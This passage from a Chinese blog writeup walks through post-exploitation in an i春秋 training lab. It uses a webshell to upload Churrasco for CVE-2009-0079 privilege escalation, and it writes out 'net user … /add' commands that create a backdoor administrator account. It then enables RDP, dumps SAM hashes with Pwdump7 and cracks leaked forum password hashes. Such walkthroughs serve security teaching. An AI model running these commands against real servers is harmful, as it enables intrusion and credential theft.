<p>那么如何确定上传点呢？具有写权限的目录都可以作为上传点，在 C 盘下的每个目录尝试上传，发现 <code>C:\Inetpub</code>、<code>C:\RECYCLER</code>、<code>C:\wmpub</code> 三个目录具有写权限，其他目录均写入失败。下面演示以 <code>C:\wmpub</code> 作为上传点。</p>
<p>系统提权将利用 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0079"><strong>CVE-2009-0079</strong></a> 漏洞，采取 <strong>cmd.exe + Churrasco.exe + 3389.bat</strong> 的工具组合，其中 cmd.exe 是为了代替原服务器中权限受限的命令行交互环境，Churrasco.exe 是用于提权的漏洞利用工具（也可用 pr.exe 与 iis.exe 等提权工具代替），3389.bat 是打开 3389 端口及远程桌面服务的批处理脚本文件。</p>
<blockquote>
<p>小贴士：CVE-2009-0079 是 Microsoft Windows RPCSS 服务隔离的本地权限提升漏洞，收录于 Microsoft 安全公告 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-012">MS09-012</a>，影响 <strong>Microsoft Windows Server 2003 SP2</strong> 等多个系统版本。</p>
</blockquote>
<p>首先将工具箱【提权工具】-&gt;【windows】目录中的三款工具，在菜刀的文件管理页面空白处，右键点击 <strong>上传文件</strong> 至服务器 <code>C:\wmpub</code> 目录下，接着右击 cmd.exe，选择 <strong>虚拟终端</strong> 进入到命令行交互界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/chopper-upload.png" alt="chopper-upload"></p>
<p>输入 <code>systeminfo</code> 命令，获取服务器系统相关信息，得知系统为 Microsoft Windows Server 2003 Enterprise Edition SP2，且只安装了一个补丁程序，即可猜测该系统存在 CVE-2009-0079 漏洞：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/systeminfo.png" alt="systeminfo"></p>
<p>接着切换到 <code>C:\wmpub</code> 目录，输入 <code>churrasco &quot;net user ichunqiu key /add&quot;</code> 命令，添加一个名为 <code>ichunqiu</code>、密码为 <code>key</code> 的用户：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-user.png" alt="churrasco-user"></p>
<p>再输入 <code>churrasco &quot;net localgroup administrators ichunqiu /add&quot;</code>命令，将 <code>ichunqiu</code> 用户添加到 <code>administrators</code> 用户组：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-localgroup.png" alt="churrasco-localgroup"></p>
<blockquote>
<p>小贴士：可通过 <code>net user</code> 与 <code>net localgroup administrators</code> 查看命令是否执行成功。</p>
</blockquote>
<p>最后输入 <code>churrasco 3389</code> 命令，打开 3389 端口及远程桌面服务：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/churrasco-3389.png" alt="churrasco-3389"></p>
<p>确认提权成功后，在本机上点击 <strong>开始 -&gt; 运行</strong>，输入 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/mstsc"><code>mstsc</code></a>，远程计算机地址为 <code>172.16.12.2</code>（在实验场景拓扑图上可见）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/mstsc.png" alt="mstsc"></p>
<p>正常情况下会弹出远程桌面，输入用户名 <code>ichunqiu</code> 与密码 <code>key</code>，即可成功登录远程服务器：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-server.png" alt="login-server"></p>
<p>进入到远程主机桌面，此时可以通过 <a target="_blank" rel="noopener" href="http://www.openwall.com/passwords/windows-pwdump">pwdump 工具</a> 获取管理员密码的哈希值，常见的 pwdump 工具有 Pwdump7、QuarksPwDump、Cain &amp; Abel 等。</p>
<blockquote>
<p>小贴士：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pwdump"><strong>pwdump</strong></a> 是一类能从 Windows <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM（Security Account Manager）</a> 中读出本地用户 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details">LM（LAN Manager）</a> 与 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM（NT LAN Manager）</a> 密码哈希值的工具（注意必须在管理员权限下），其中 LM 与 NTLM 是 Windows 系统下的安全认证协议，并且 NTLM 是 LM 的演进版本，安全性更高。</p>
</blockquote>
<p>下面以 <a target="_blank" rel="noopener" href="http://www.tarasco.org/security/pwdump_7/index.html"><strong>Pwdump7</strong></a> 为例进行演示，先将实验工具箱【提权工具】-&gt;【hash】-&gt;【Pwdump7】文件夹下的 <strong>Pwdump7.exe</strong> 与 <strong>libeay32.dll</strong> 两个文件通过菜刀上传至服务器 <code>C:\wmpub</code> 目录，再回到远程主机桌面点击【开始】 -&gt; 【我的电脑】，进入上传点打开 cmd.exe，直接输入 <code>pwdump7</code> 命令即可获得所有用户的密码哈希值，其中 <code>3C8D6C158F6FB3D1FDCFC2AFB2D1BE34</code> 是 LM 哈希，<code>594B9CD2577A5AC2BE0CA522D5EC6ACE</code> 是 NTLM 哈希：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/pwdump7.png" alt="pwdump7"></p>
<p> 最后，打开在线哈希值破解工具 <a target="_blank" rel="noopener" href="http://www.objectif-securite.ch/">Objectif Sécurité </a>，在主页点击 <strong>OPHCRACK</strong> 选项卡，将 NTLM 哈希 <code>594B9CD2577A5AC2BE0CA522D5EC6ACE</code> 填入第一个文本框，点击 <strong>GO</strong> 解密后，即得管理员系统密码的明文 <code>88hvpebv</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/objectif.png" alt="objectif"></p>
<h1 id="0x05-文末彩蛋"><a href="#0x05-文末彩蛋" class="headerlink" title="0x05 文末彩蛋"></a>0x05 文末彩蛋</h1><p>当我们拥有了服务器管理员账号 <code>Administrator</code> 与密码 <code>88hvpebv</code> 后，可以打开上帝视角来回顾一下靶机渗透环境，对之前渗透过程中遇到的有趣现象有更深入的理解。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-server-admin.png" alt="login-server-admin"></p>
<h2 id="直接查看-SSMS-账户的密码？"><a href="#直接查看-SSMS-账户的密码？" class="headerlink" title="直接查看 SSMS 账户的密码？"></a>直接查看 SSMS 账户的密码？</h2><p>进入到远程服务器的管理员桌面后，发现了数据库集成环境 <strong>SQL Server Management Studio</strong>，心想是否能直接通过该 IDE 查看到账户 <code>sa</code> 的密码呢？于是打开 SSMS，点击 <strong>连接(C)</strong> 进入数据库服务器，在 <strong>ADMIN-508BF95B0 -&gt; 安全性 -&gt; 登录名</strong> 路径下找到账户 <code>sa</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/ssms-user.png" alt="ssms-user"></p>
<p>双击 <code>sa</code> 账户，发现在登录属性中只能看到其密码的 <code>*</code> 号隐藏值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/ssms-sa.png" alt="ssms-sa"></p>
<p>搜索了许多相关资料后才知道，<strong>只能通过 SSMS 修改密码，但不能查看原密码</strong>，否则安全性怎么保证呢？想了想确实也是，因此账户 <code>sa</code> 的密码除了在主站数据库配置文件中作为敏感信息泄露外，目前暂无他法，若读者们找到了其他途径获得密码，还请分享交流。</p>
<h2 id="「linhai」的论坛后台管理密码？"><a href="#「linhai」的论坛后台管理密码？" class="headerlink" title="「linhai」的论坛后台管理密码？"></a>「linhai」的论坛后台管理密码？</h2><p>通过菜刀在主站 <code>/bbs/Data/</code> 目录下发现了数据库 <code>dtxy.mdb</code> 的备份文件 <code>dtxy.asp</code>，与上文类似，将其下载至桌面，并改名为 <code>dtxy.mdb</code>，点击右键查看其属性，<strong>如果发现其大小为 0 字节，则说明下载失败。</strong>此时若用明小子注入工具打开，则会<strong>弹出输入数据库密码的提示，实际上是由于识别了无效的数据库文件</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-error.png" alt="dtxy-error"></p>
<p>笔者在实验过程中时而下载成功，时而失败，原因至今不明。经过反复试验，这里提供两种解决方法，供大家参考：</p>
<h3 id="将-dtxy-asp-复制到其他文件夹再下载"><a href="#将-dtxy-asp-复制到其他文件夹再下载" class="headerlink" title="将 dtxy.asp 复制到其他文件夹再下载"></a>将 dtxy.asp 复制到其他文件夹再下载</h3><p>笔者尝试将 <code>dtxy.asp</code> 复制到其他文件夹中（如 <code>/bbs/Board/</code>），下载后发现其大小终于不为 0 字节，说明下载成功。</p>
<p>更有意思的是，将其他文件夹的文件（如 <code>/bbs/Board/Board.asp</code>）复制到  <code>/bbs/Data/</code>  中，也能正常下载。</p>
<p>因此，结论是<strong>原本就在 <code>/bbs/Data/</code> 目录下的文件不能正常下载，至少刚开始连上菜刀的时候不行。</strong>后面不知过了多久，经过了什么操作，又能够正常下载了。这一神奇的现象笔者至今无法理解，请有经验的前辈多多指点。</p>
<h3 id="直接将明小子注入工具上传至服务器"><a href="#直接将明小子注入工具上传至服务器" class="headerlink" title="直接将明小子注入工具上传至服务器"></a>直接将明小子注入工具上传至服务器</h3><p>另一种方法，是在成功提权的情况下，直接将明小子注入工具通过菜刀上传至服务器，即可在远程服务器内利用明小子查看任意数据库文件，避免了下载文件可能出错的问题。</p>
<h3 id="获取论坛用户密码"><a href="#获取论坛用户密码" class="headerlink" title="获取论坛用户密码"></a>获取论坛用户密码</h3><p>通过以上两种方法，即可成功查看数据库 <code>dtxy.asp</code> 中的内容。双击 <code>LeadBBS_User</code> 表，即可看到论坛所有用户的相关信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-user.png" alt="dtxy-user"></p>
<p>其中，用户 <code>linhai</code> 的密码哈希值为 <code>e10adc3949ba59abbe56e057f20f883e</code>，解密后得到密码明文 <code>123456</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-linhai-password.png" alt="dtxy-linhai-password"></p>
<p>还可验证管理员用户 <code>Admin</code> 的密码哈希值 <code>21232f297a57a5a743894a0e4a801fc3</code>，解密后确实为 <code>admin</code>，与之前的猜测一致：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-admin-password.png" alt="dtxy-admin-password"></p>
<p>事实上，整个 Web 应用程序<strong>最有价值</strong>的就是这张表，里面包含所有用户的隐私信息，不仅能实现任意用户登录，而且还能通过撞库威胁其他 Web 应用上的账户，甚至利用钓鱼或社工手段骗取钱财。<strong>因此，该表通常也是黑产的终极目标，也是互联网企业最核心的用户资产，其重要性不言而喻。</strong></p>
<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p> 本篇 writeup 是 <strong>i春秋「渗透测试入门」系列实验</strong>的最后一作，在前篇 writeup <a target="_blank" rel="noopener" href="https://ciphersaw.github.io/2018/03/20/%E3%80%90i%E6%98%A5%E7%A7%8B%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%20%E2%80%94%E2%80%94%20%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/">【i春秋】渗透测试入门 —— 我很简单，请不要欺负我</a> 的基础上，加强巩固了渗透测试过程中信息收集、社工运用、SQL 注入、上传图片木马、获取 webshell、权限提升、获取系统用户密码等技巧的使用。</p>
<p>笔者水平有限，希望自己的一点心得体会有助于各位读者加深对渗透测试的理解，在动手实践之后能更熟练地掌握渗透工具。最后向以下两篇参考 writeup 的作者致谢，欢迎各位指出不足之处，分享独特思路。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-1821-1-1.html">02-在线挑战详细攻略-《网站综合渗透实验》</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/renzongxian/p/4957762.html">ichunqiu在线挑战–网站综合渗透实验 writeup</a></p>
</blockquote>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>Cipher Saw
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://ciphersaw.me/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/" title="【i春秋】渗透测试入门 —— 网站综合渗透实验">https://ciphersaw.me/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
              <a href="/tags/Web/" rel="tag"># Web</a>
              <a href="/tags/Crypto/" rel="tag"># Crypto</a>
              <a href="/tags/Vulnerability/" rel="tag"># Vulnerability</a>
              <a href="/tags/i%E6%98%A5%E7%A7%8B/" rel="tag"># i春秋</a>
              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
              <a href="/tags/Exploit/" rel="tag"># Exploit</a>
              <a href="/tags/CMS/" rel="tag"># CMS</a>
              <a href="/tags/SQLi/" rel="tag"># SQLi</a>
              <a href="/tags/Trojan/" rel="tag"># Trojan</a>
              <a href="/tags/Social-Engineering/" rel="tag"># Social Engineering</a>
              <a href="/tags/ASP/" rel="tag"># ASP</a>
              <a href="/tags/Database/" rel="tag"># Database</a>
              <a href="/tags/Privilege/" rel="tag"># Privilege</a>
              <a href="/tags/CMD/" rel="tag"># CMD</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2018/03/20/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/" rel="prev" title="【i春秋】渗透测试入门 —— 我很简单，请不要欺负我">
                  <i class="fa fa-chevron-left"></i> 【i春秋】渗透测试入门 —— 我很简单，请不要欺负我
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2018/05/23/python-trick-tcp-server-and-client/" rel="next" title="Python 绝技 —— TCP 服务器与客户端">
                  Python 绝技 —— TCP 服务器与客户端 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    
  <div class="comments" id="disqus_thread">
    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
  </div>
  
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-space-shuttle"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cipher Saw</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>



  <script src="/js/third-party/fancybox.js"></script>


  


  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"KWe6NtO4vhgQR3IfB99JElre-gzGzoHsz","app_key":"7nrrRDyHHUMcx03upUALYKIQ","server_url":null,"security":false}</script>
  <script src="/js/third-party/statistics/lean-analytics.js"></script>


  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"ciphersaw","count":false,"i18n":{"disqus":"disqus"}}</script>
<script src="/js/third-party/comments/disqus.js"></script>

</body>
</html>
